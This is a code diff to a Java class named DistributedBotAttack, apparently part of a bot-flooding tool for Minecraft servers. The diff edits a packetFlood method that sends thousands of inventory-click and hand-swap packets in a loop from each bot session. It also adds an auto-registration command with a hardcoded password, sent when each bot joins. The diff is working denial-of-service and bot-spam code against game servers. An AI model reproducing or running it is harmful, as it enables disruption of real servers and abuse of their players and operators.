@@ -8,15 +8,18 @@ import java.net.Socket;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
+import java.util.UUID;
 import java.util.concurrent.*;
 import java.util.concurrent.atomic.AtomicInteger;
 import com.github.steveice10.mc.protocol.MinecraftProtocol;
+import com.github.steveice10.mc.protocol.data.game.LastSeenMessage;
 import com.github.steveice10.mc.protocol.data.game.entity.metadata.ItemStack;
 import com.github.steveice10.mc.protocol.data.game.entity.object.Direction;
 import com.github.steveice10.mc.protocol.data.game.entity.player.PlayerAction;
 import com.github.steveice10.mc.protocol.data.game.inventory.ContainerAction;
 import com.github.steveice10.mc.protocol.data.game.inventory.ContainerActionType;
 import com.github.steveice10.mc.protocol.packet.ingame.clientbound.*;
+import com.github.steveice10.mc.protocol.packet.ingame.serverbound.ServerboundChatCommandPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundContainerClickPacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.level.ServerboundMoveVehiclePacket;
 import com.github.steveice10.mc.protocol.packet.ingame.serverbound.player.ServerboundPlayerActionPacket;
@@ -113,12 +116,12 @@ public class DistributedBotAttack extends IAttack{
     }
     public void packetFlood(Session session){
         for (int i=0;i<1000;i++){
-            session.send(new ServerboundContainerClickPacket(0, 14, -1, ContainerActionType.SHIFT_CLICK_ITEM, new ContainerAction() {
+            session.send(new ServerboundContainerClickPacket(0, 14, -1, ContainerActionType.DROP_ITEM, new ContainerAction() {
                 @Override
                 public int hashCode() {
                     return super.hashCode();
                 }
-            }, new ItemStack(23), new HashMap<Integer, ItemStack>()));
+            }, new ItemStack(23), new HashMap<>()));
             session.send(new ServerboundPlayerActionPacket(PlayerAction.SWAP_HANDS,Vector3i.ONE, Direction.EAST,69));
         }
     }
@@ -169,6 +172,7 @@ public class DistributedBotAttack extends IAttack{
                 if(packet instanceof ClientboundLoginPacket){
                     e.setFlag("join",true);
                     mainUtils.log("Client","[连接成功]["+username+"]");
+                    client.send(new ServerboundChatCommandPacket("/register 2096875wang@^$%$ 2096875wang@^$%$",System.currentTimeMillis(),2332,new ArrayList<>(),false,new ArrayList<>(),new LastSeenMessage(UUID.fromString(username),new byte[32])));
                 }
             }
             @Override
